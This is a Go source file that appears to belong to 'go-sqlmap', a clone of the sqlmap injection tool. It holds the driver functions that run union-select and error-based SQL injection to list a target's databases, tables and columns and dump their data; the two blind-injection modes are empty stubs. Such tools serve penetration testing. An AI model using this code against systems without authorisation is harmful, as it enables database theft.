package start

import (
	"go-sqlmap/core"
	"go-sqlmap/log"
	"go-sqlmap/util"
)

func RunUnionSelect(target string, params Input, suffixList []string) bool {
	log.Info("start union select injection...")
	suffix, key := core.GetOrderByNum(suffixList, target)
	if key == 0 {
		return false
	}
	cleanUrl := util.GetCleanUrl(target)
	pos := core.GetUnionSelectPos(suffix, cleanUrl, key)
	if pos.StartIndex == 0 {
		return false
	}
	core.GetVersion(pos, suffix, cleanUrl, key)
	core.GetCurrentDatabase(pos, suffix, cleanUrl, key)
	core.GetAllDatabases(pos, suffix, cleanUrl, key)
	if params.Database != "" {
		core.GetAllTables(pos, suffix, cleanUrl, key, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		core.GetColumns(pos, suffix, cleanUrl, key, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		core.GetData(pos, suffix, cleanUrl, key, params.Database, params.Table, params.Columns)
	}
	return true
}

func RunErrorBased(target string, params Input, suffixList []string) bool {
	log.Info("start error based injection...")
	success, suffix := core.DetectErrorBased(target, suffixList)
	if !success {
		return false
	}
	if params.Beta == true {
		core.GetVersionByErrorBasedPolygon(target, suffix)
		core.GetCurrentDatabaseByErrorBasedPolygon(target, suffix)
		core.GetAllDatabasesByErrorBasedPolygon(target, suffix)
		core.GetAllTablesByErrorBasedPolygon(target, suffix, params.Database)
		core.GetAllColumnsByErrorBasedPolygon(target, suffix, params.Database, params.Table)
		core.GetAllDataByErrorBasedPolygon(target, suffix, params.Database, params.Table, params.Columns)
	} else {
		core.GetVersionByErrorBased(target, suffix)
		core.GetCurrentDatabaseByErrorBased(target, suffix)
		core.GetAllDatabasesByErrorBased(target, suffix)
		core.GetAllTablesByErrorBased(target, suffix, params.Database)
		core.GetAllColumnsByErrorBased(target, suffix, params.Database, params.Table)
		core.GetAllDataByErrorBased(target, suffix, params.Database, params.Table, params.Columns)
	}
	return true
}

func RunBoolBlind(target string, params Input, suffixList []string) bool {
	log.Info("start bool blind injection...")
	// TODO
	return false
}

func RunTimeBlind(target string, params Input, suffixList []string) bool {
	log.Info("start time blind injection...")
	// TODO
	return false
}
